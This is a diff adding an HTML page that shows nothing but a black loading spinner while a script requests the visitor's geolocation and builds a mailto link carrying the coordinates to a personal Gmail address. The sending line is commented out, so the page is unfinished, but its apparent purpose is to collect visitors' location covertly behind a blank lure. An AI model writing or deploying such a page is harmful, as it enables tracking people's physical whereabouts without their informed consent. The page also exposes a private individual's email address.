@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+        body{background-color: black;
+        min-height: 100vh;
+        }
+        #spinner{
+    height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background-color: black;
+}
+.spinner-appear{
+    width: 70px;
+    height: 70px;
+    border-radius: 50%;
+    border: 4px solid #F2C343!important;
+    border-top-color: #333 !important;
+    animation: spin 1s infinite linear; 
+    display: block;
+    
+  }
+  
+  @keyframes spin {
+    0% {
+      transform: rotate(0deg);
+    }
+    100% {
+      transform: rotate(360deg);
+    }
+  }
+    </style>
+</head>
+<body>
+    <div id="spinner" ><div class="spinner-appear"></div></div>
+
+    <script>
+        function sendEmail(loc) {
+  const subject='email subject';
+  var mailtoLink = 'mailto:fatmsalah767@gmail.com' +
+  '?subject=' + encodeURIComponent(subject) +
+  '&body=' + encodeURIComponent('location: ' + loc);
+  // window.location.href = mailtoLink;
+  }
+// Get the user's location
+if (navigator.geolocation) {
+  navigator.geolocation.getCurrentPosition(function(position) {
+    var latitude = position.coords.latitude;
+    var longitude = position.coords.longitude;
+    var location = 'Latitude: ' + latitude + ', Longitude: ' + longitude;
+
+    // Call the updated function with the user's location
+    sendEmail(location) ;
+    console.log('done');
+    // sendEmail2('John Doe', 'johndoe@example.com', '1234567890', 'Role', 'Institution', 'Message', location);
+  });
+} else {
+  console.log('Geolocation is not supported by this browser.');
+}
+
+    </script>
+</body>
+</html>
